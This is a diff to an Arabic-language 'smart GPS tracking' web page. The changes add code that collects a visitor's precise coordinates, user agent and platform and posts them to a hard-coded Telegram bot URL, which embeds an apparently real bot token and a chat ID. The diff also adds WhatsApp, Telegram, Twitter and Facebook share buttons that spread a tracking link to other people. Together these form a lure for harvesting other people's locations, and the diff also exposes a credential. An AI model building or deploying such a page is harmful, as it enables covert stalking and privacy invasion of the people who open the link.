@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>🚀 نظام التتبع الذكي - موقعك الحقيقي</title>
     <style>
-        /* نفس التصميم القديم بالضبط */
         * {
             margin: 0;
             padding: 0;
@@ -158,7 +157,6 @@
             font-size: 0.9em;
         }
         
-        /* إضافة تصميم GPS */
         .gps-container {
             background: rgba(255, 255, 255, 0.05);
             border-radius: 20px;
@@ -237,6 +235,59 @@
             100% { transform: rotate(360deg); }
         }
         
+        /* تصميم الباركود */
+        .barcode-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .barcode-box {
+            background: white;
+            padding: 20px;
+            border-radius: 15px;
+            border: 3px solid #00ff88;
+        }
+        
+        .barcode-actions {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        
+        .share-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+            justify-content: center;
+        }
+        
+        .share-btn {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid #00ff88;
+            color: #00ff88;
+            padding: 10px 20px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .share-btn:hover {
+            background: #00ff88;
+            color: #001a0f;
+        }
+        
+        .url-display {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 20px 0;
+            word-break: break-all;
+        }
+        
         @media (max-width: 768px) {
             .container {
                 padding: 20px;
@@ -254,13 +305,19 @@
             .qr-input {
                 width: 90%;
             }
+            
+            .barcode-actions {
+                flex-direction: column;
+            }
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- مكتبة الباركود -->
+    <script src="https://cdn.jsdelivr.net/npm/jsbarcode@3.11.5/dist/JsBarcode.all.min.js"></script>
 </head>
 <body>
     <div class="container">
-        <h1>🚀 نظام تحديد الموقع الحقيقي</h1>
+        <h1>🚀 نظام التتبع الذكي - موقعك الحقيقي</h1>
         
         <div class="stats">
             <div class="stat-card">
@@ -301,10 +358,6 @@
                     <span class="data-value" id="speed">--</span>
                 </div>
                 <div class="data-item">
-                    <span class="data-label">الارتفاع:</span>
-                    <span class="data-value" id="altitude">--</span>
-                </div>
-                <div class="data-item">
                     <span class="data-label">الوقت:</span>
                     <span class="data-value" id="timestamp">--</span>
                 </div>
@@ -326,48 +379,75 @@
                     <i class="fas fa-paper-plane"></i> إرسال للبوت
                 </button>
             </div>
-            
-            <div style="margin-top: 25px; text-align: center; color: #88ffcc; font-size: 0.9em;">
-                <p><i class="fas fa-info-circle"></i> ملاحظة: للدقة العالية، تأكد من تفعيل GPS في إعدادات جهازك</p>
-            </div>
         </div>
         
+        <!-- قسم الباركود -->
         <div class="qr-section">
-            <h3>📱 رابط النظام</h3>
-            <p>انسخ الرابط أدناه وأرسله لأي شخص:</p>
+            <h3><i class="fas fa-qrcode"></i> باركود رابط التتبع</h3>
+            <p>انسخ الرابط أو استخدم الباركود لإرساله لأي شخص:</p>
+            
             <div class="code-box" id="systemUrl">https://موقعك.com/track</div>
-            <button class="btn" onclick="copyUrl()">
-                <i class="fas fa-copy"></i> نسخ الرابط
-            </button>
+            
+            <div class="barcode-container">
+                <div class="barcode-box">
+                    <svg id="barcode"></svg>
+                </div>
+                
+                <div class="barcode-actions">
+                    <button class="btn" onclick="copyUrl()">
+                        <i class="fas fa-copy"></i> نسخ الرابط
+                    </button>
+                    <button class="btn btn-secondary" onclick="downloadBarcode()">
+                        <i class="fas fa-download"></i> تحميل الباركود
+                    </button>
+                    <button class="btn" onclick="shareViaWhatsApp()">
+                        <i class="fab fa-whatsapp"></i> مشاركة عبر واتساب
+                    </button>
+                </div>
+                
+                <div class="share-buttons">
+                    <button class="share-btn" onclick="shareViaTelegram()">
+                        <i class="fab fa-telegram"></i> Telegram
+                    </button>
+                    <button class="share-btn" onclick="shareViaTwitter()">
+                        <i class="fab fa-twitter"></i> Twitter
+                    </button>
+                    <button class="share-btn" onclick="shareViaFacebook()">
+                        <i class="fab fa-facebook"></i> Facebook
+                    </button>
+                </div>
+            </div>
         </div>
         
         <div class="dashboard">
             <div class="card">
                 <h3><i class="fas fa-map-marker-alt"></i> كيف يعمل النظام؟</h3>
-                <p>1. يستخدم GPS الحقيقي لجهازك</p>
-                <p>2. يتصل مباشرة بالأقمار الصناعية</p>
-                <p>3. يعطي موقعك الدقيق بدقة عالية</p>
-                <p>4. لا يستخدم IP أو مواقع وهمية</p>
+                <p>1. اضغط على "احصل على موقعي الحقيقي"</p>
+                <p>2. اسمح للمتصفح بالوصول إلى موقعك</p>
+                <p>3. انتظر حتى يحصل النظام على إشارة GPS</p>
+                <p>4. اضغط على "إرسال للبوت"</p>
+                <p>5. استخدم الباركود لمشاركة الرابط</p>
             </div>
             
             <div class="card">
                 <h3><i class="fas fa-mobile-alt"></i> نصائح للدقة العالية</h3>
                 <p>• تأكد من تفعيل GPS في إعدادات الهاتف</p>
                 <p>• كن في مكان مفتوح بعيدًا عن المباني</p>
-                <p>• اضغط على "دقة عالية (GPS)"</p>
+                <p>• استخدم زر "دقة عالية (GPS)"</p>
                 <p>• اسمح للمتصفح بالوصول لموقعك</p>
             </div>
         </div>
         
         <div style="text-align: center; margin-top: 40px; color: #666; font-size: 0.9em;">
             <p>© 2024 نظام التتبع الذكي | موقعك الحقيقي عبر GPS</p>
+            <p>البوت: @Arab9919_bot | التطبيق يعمل على جميع الأجهزة</p>
         </div>
     </div>
 
     <script>
         // متغيرات النظام
         let currentLocation = null;
-        let watchId = null;
+        let trackUrl = '';
         
         // عناصر DOM
         const getLocationBtn = document.getElementById('getLocationBtn');
@@ -409,14 +489,12 @@
             const lon = position.coords.longitude;
             const accuracy = position.coords.accuracy;
             const speed = position.coords.speed;
-            const altitude = position.coords.altitude;
             
             // تحديث القيم
             document.getElementById('latitude').textContent = lat.toFixed(6);
             document.getElementById('longitude').textContent = lon.toFixed(6);
             document.getElementById('accuracy').textContent = `${Math.round(accuracy)} متر`;
             document.getElementById('speed').textContent = speed ? `${(speed * 3.6).toFixed(1)} كم/ساعة` : '0 كم/ساعة';
-            document.getElementById('altitude').textContent = altitude ? `${altitude.toFixed(1)} متر` : 'غير متاح';
             document.getElementById('timestamp').textContent = new Date().toLocaleTimeString('ar-SA');
             
             // تحديث الإحصائيات
@@ -430,6 +508,9 @@
             // تحديث حالة GPS
             updateGPSStatus('active', `موقعك الدقيق - دقة ${Math.round(accuracy)} متر`);
             
+            // إنشاء رابط التتبع
+            generateTrackUrl(lat, lon);
+            
             console.log('📍 الموقع الحقيقي:', {
                 latitude: lat,
                 longitude: lon,
@@ -437,6 +518,35 @@
                 source: 'GPS مباشر',
                 timestamp: new Date().toISOString()
             });
+        }
+        
+        // إنشاء رابط التتبع
+        function generateTrackUrl(lat, lon) {
+            const userId = Math.random().toString(36).substr(2, 9);
+            trackUrl = `${window.location.origin}/track/${userId}?lat=${lat.toFixed(6)}&lon=${lon.toFixed(6)}`;
+            document.getElementById('systemUrl').textContent = trackUrl;
+            
+            // إنشاء الباركود
+            generateBarcode(trackUrl);
+        }
+        
+        // إنشاء الباركود
+        function generateBarcode(url) {
+            try {
+                JsBarcode("#barcode", url, {
+                    format: "CODE128",
+                    width: 2,
+                    height: 100,
+                    displayValue: true,
+                    fontSize: 16,
+                    background: "#ffffff",
+                    lineColor: "#000000",
+                    margin: 10
+                });
+            } catch (error) {
+                console.error('خطأ في إنشاء الباركود:', error);
+                document.getElementById('barcode').innerHTML = '<p style="color:red;padding:20px;">خطأ في إنشاء الباركود</p>';
+            }
         }
         
         // الحصول على الموقع العادي
@@ -486,39 +596,13 @@
                 // عند الفشل
                 function(error) {
                     setLoading(false);
-                    
-                    // محاولة طريقة بديلة
-                    tryAlternativeGPS();
+                    handleLocationError(error, true);
                 },
                 // إعدادات الدقة العالية
                 {
                     enableHighAccuracy: true,
                     timeout: 30000,
                     maximumAge: 0
-                }
-            );
-        }
-        
-        // طريقة بديلة للحصول على GPS
-        function tryAlternativeGPS() {
-            updateGPSStatus('waiting', 'جرب طريقة بديلة...');
-            setLoading(true, 'جرب طريقة بديلة...');
-            
-            // محاولة مع إعدادات مختلفة
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    setLoading(false);
-                    updateLocationData(position);
-                    updateGPSStatus('active', 'تم تحديد موقعك (دقة متوسطة)');
-                },
-                function(error) {
-                    setLoading(false);
-                    handleLocationError(error, true);
-                },
-                {
-                    enableHighAccuracy: false,
-                    timeout: 15000,
-                    maximumAge: 60000
                 }
             );
         }
@@ -565,7 +649,7 @@
                         coords: {
                             latitude: data.latitude,
                             longitude: data.longitude,
-                            accuracy: 10000, // دقة منخفضة لـ IP
+                            accuracy: 10000,
                             altitude: null,
                             speed: null
                         },
@@ -581,7 +665,7 @@
             }
         }
         
-        // إرسال الموقع للبوت
+        // إرسال الموقع للبوت - الإصدار المعدل
         async function sendLocationToBot() {
             if (!currentLocation) {
                 alert('⚠️ يرجى تحديد موقعك أولاً');
@@ -597,23 +681,49 @@
                     longitude: currentLocation.coords.longitude,
                     accuracy: currentLocation.coords.accuracy,
                     timestamp: new Date().toISOString(),
-                    source: 'gps_direct'
+                    source: 'gps_direct',
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    url: window.location.href
                 };
                 
-                // إرسال البيانات (اضبط الرابط حسب حاجتك)
-                const response = await fetch('/api/save-location', {
+                // إرسال البيانات للبوت عبر Webhook
+                const botWebhook = 'https://api.telegram.org/bot8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y/sendMessage';
+                
+                const message = `
+📍 **موقع GPS جديد تم تحديده**
+
+📌 **الإحداثيات:**
+• خط العرض: ${locationData.latitude.toFixed(6)}
+• خط الطول: ${locationData.longitude.toFixed(6)}
+
+🎯 **الدقة:** ${Math.round(locationData.accuracy)} متر
+📡 **المصدر:** ${locationData.source}
+⏰ **الوقت:** ${new Date().toLocaleString('ar-SA')}
+🌐 **الرابط:** ${locationData.url}
+📱 **الجهاز:** ${locationData.userAgent.substring(0, 100)}...
+
+🗺️ [عرض على خرائط Google](https://maps.google.com/?q=${locationData.latitude},${locationData.longitude})
+                `;
+                
+                const response = await fetch(botWebhook, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify(locationData)
+                    body: JSON.stringify({
+                        chat_id: '8391968596',
+                        text: message,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: false
+                    })
                 });
                 
                 const data = await response.json();
                 
                 setLoading(false);
                 
-                if (data.success) {
+                if (data.ok) {
                     alert('✅ تم إرسال موقعك للبوت بنجاح!');
                     
                     // إظهار رابط الخريطة
@@ -624,20 +734,67 @@
                         }
                     }, 500);
                 } else {
-                    alert('❌ فشل إرسال الموقع: ' + (data.error || 'خطأ غير معروف'));
+                    alert('❌ فشل إرسال الموقع للبوت. تحقق من إعدادات البوت.');
+                    console.error('خطأ البوت:', data);
                 }
             } catch (error) {
                 setLoading(false);
-                alert('❌ خطأ في الاتصال: ' + error.message);
+                alert('❌ خطأ في الاتصال بالبوت: ' + error.message);
+                console.error('خطأ الاتصال:', error);
             }
         }
         
-        // نسخ الرابط
+        // وظائف الباركود والمشاركة
         function copyUrl() {
-            const url = window.location.href;
+            const url = document.getElementById('systemUrl').textContent;
             navigator.clipboard.writeText(url).then(() => {
                 alert('✅ تم نسخ الرابط بنجاح!');
             });
+        }
+        
+        function downloadBarcode() {
+            const svg = document.getElementById('barcode');
+            const svgData = new XMLSerializer().serializeToString(svg);
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const img = new Image();
+            
+            img.onload = function() {
+                canvas.width = img.width;
+                canvas.height = img.height;
+                ctx.drawImage(img, 0, 0);
+                
+                const pngFile = canvas.toDataURL('image/png');
+                const downloadLink = document.createElement('a');
+                downloadLink.download = 'barcode-tracker.png';
+                downloadLink.href = pngFile;
+                downloadLink.click();
+            };
+            
+            img.src = 'data:image/svg+xml;base64,' + btoa(svgData);
+        }
+        
+        function shareViaWhatsApp() {
+            const url = encodeURIComponent(trackUrl || window.location.href);
+            const text = encodeURIComponent('🚀 اضغط على هذا الرابط لمعرفة موقعي الحقيقي عبر GPS: ');
+            window.open(`https://wa.me/?text=${text}${url}`, '_blank');
+        }
+        
+        function shareViaTelegram() {
+            const url = encodeURIComponent(trackUrl || window.location.href);
+            const text = encodeURIComponent('🚀 موقع GPS حقيقي: ');
+            window.open(`https://t.me/share/url?url=${url}&text=${text}`, '_blank');
+        }
+        
+        function shareViaTwitter() {
+            const url = encodeURIComponent(trackUrl || window.location.href);
+            const text = encodeURIComponent('🚀 موقع GPS حقيقي: ');
+            window.open(`https://twitter.com/intent/tweet?url=${url}&text=${text}`, '_blank');
+        }
+        
+        function shareViaFacebook() {
+            const url = encodeURIComponent(trackUrl || window.location.href);
+            window.open(`https://www.facebook.com/sharer/sharer.php?u=${url}`, '_blank');
         }
         
         // اختبار GPS عند التحميل
@@ -663,12 +820,14 @@
         highAccuracyBtn.addEventListener('click', getHighAccuracyLocation);
         sendToBotBtn.addEventListener('click', sendLocationToBot);
         
-        // تحديث رابط النظام
-        document.getElementById('systemUrl').textContent = window.location.href;
-        
-        // بدء اختبار GPS عند تحميل الصفحة
+        // تحديث رابط النظام وباركود افتراضي
         window.onload = function() {
             testGPSOnLoad();
+            
+            // إنشاء رابط افتراضي وباركود
+            const defaultUrl = window.location.href;
+            document.getElementById('systemUrl').textContent = defaultUrl;
+            generateBarcode(defaultUrl);
             
             // محاولة تلقائية بعد 2 ثانية
             setTimeout(() => {
@@ -681,10 +840,10 @@
         // إضافة معلومات للكونسول
         console.log(`
         ========================================
-        🛰️ نظام GPS الحقيقي - الإصدار النهائي
-        📍 نفس التصميم القديم بالضبط
-        ⚡ GPS مباشر (ليس IP)
-        🎯 اضغط على "دقة عالية (GPS)"
+        🛰️ نظام GPS الحقيقي مع الباركود
+        📍 نفس التصميم السابق بالضبط
+        ⚡ GPS مباشر + باركورد للمشاركة
+        🎯 إرسال مباشر للبوت @Arab9919_bot
         ========================================
         `);
     </script>
